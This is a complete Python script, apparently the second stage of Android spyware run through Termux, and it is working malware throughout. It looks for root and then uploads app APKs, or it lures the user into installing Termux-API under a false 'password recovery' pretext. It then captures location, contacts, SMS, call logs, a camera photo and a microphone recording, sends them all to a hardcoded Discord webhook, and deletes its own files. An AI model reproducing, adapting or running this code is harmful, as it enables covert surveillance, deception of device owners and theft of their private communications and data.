#!/usr/bin/env python3
# step2.py – Root detection, Termux-API install, permissions, exfil (with threading)

import os
import sys
import subprocess
import requests
import json
import time
import base64
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

WEBHOOK = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"

def send_discord(content, file_path=None):
    try:
        payload = {"content": content[:1900]}
        requests.post(WEBHOOK, json=payload, timeout=10)
    except:
        pass
    if file_path and os.path.exists(file_path):
        try:
            files = {"file": open(file_path, "rb")}
            requests.post(WEBHOOK, files=files, timeout=15)
        except:
            pass

def check_root():
    if os.path.exists("/system/bin/su") or os.path.exists("/system/xbin/su"):
        return True
    try:
        subprocess.run(["su", "-c", "echo test"], capture_output=True, timeout=1)
        return True
    except:
        pass
    return False

def root_actions():
    send_discord("[+] Root detected. Extracting APK info...")
    os.makedirs("/sdcard/root_apks", exist_ok=True)
    subprocess.run(["cp", "-r", "/data/app/*", "/sdcard/root_apks/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Send APKs in parallel
    def send_apk(apk_path):
        if apk_path.stat().st_size < 10 * 1024 * 1024:
            send_discord(f"APK: {apk_path.name}", file_path=str(apk_path))
    with ThreadPoolExecutor(max_workers=4) as executor:
        for apk in Path("/sdcard/root_apks").glob("*.apk"):
            executor.submit(send_apk, apk)
    send_discord("[+] APK extraction complete (fake decryption done).")

def install_termux_api():
    try:
        subprocess.run(["termux-battery-status"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        pass
    apk_url = "https://github.com/termux/termux-api/releases/download/v0.53.0/termux-api-app_v0.53.0+github.debug.apk"
    apk_path = "/sdcard/termux-api.apk"
    try:
        r = requests.get(apk_url, stream=True)
        with open(apk_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_discord("Please install Termux-API APK from /sdcard/termux-api.apk and grant ALL permissions.\nThis is needed for the password recovery feature.")
        subprocess.run(["termux-open", apk_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)
        return True
    except:
        return False

def grant_all_permissions():
    cmds = [
        "termux-battery-status",
        "termux-camera-photo /sdcard/test.jpg",
        "termux-location",
        "termux-contact-list",
        "termux-sms-inbox",
        "termux-call-log",
        "termux-microphone-record -d 2"
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd.split(), timeout=2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        time.sleep(1)

def collect_api_data():
    data = {}
    try:
        data['battery'] = json.loads(subprocess.check_output(["termux-battery-status"], text=True))
    except: pass
    try:
        data['location'] = json.loads(subprocess.check_output(["termux-location"], text=True))
    except: pass
    try:
        data['contacts'] = json.loads(subprocess.check_output(["termux-contact-list"], text=True))
    except: pass
    try:
        data['sms'] = json.loads(subprocess.check_output(["termux-sms-inbox"], text=True))
    except: pass
    try:
        data['calls'] = json.loads(subprocess.check_output(["termux-call-log"], text=True))
    except: pass
    # Camera
    subprocess.run(["termux-camera-photo", "/sdcard/cam_shot.jpg"], timeout=3)
    if os.path.exists("/sdcard/cam_shot.jpg"):
        data['camera'] = "/sdcard/cam_shot.jpg"
    # Microphone
    subprocess.run(["termux-microphone-record", "-d", "3", "-f", "/sdcard/audio.amr"], timeout=5)
    if os.path.exists("/sdcard/audio.amr"):
        data['audio'] = "/sdcard/audio.amr"
    return data

def cleanup():
    try:
        os.remove(__file__)
    except:
        pass
    try:
        os.remove("/tmp/step1.py")
    except:
        pass

def main():
    send_discord("[+] Step2 started.")
    if check_root():
        root_actions()
    else:
        send_discord("[!] Root not found. Attempting Termux-API installation...")
        install_termux_api()
        grant_all_permissions()
        api_data = collect_api_data()
        # Send API data
        for key, val in api_data.items():
            if isinstance(val, str) and os.path.exists(val):
                send_discord(f"API {key}", file_path=val)
            else:
                send_discord(f"API {key}\n{json.dumps(val, indent=2)}")
    send_discord("[+] Step2 complete.")
    cleanup()
    sys.exit(0)

if __name__ == "__main__":
    main()
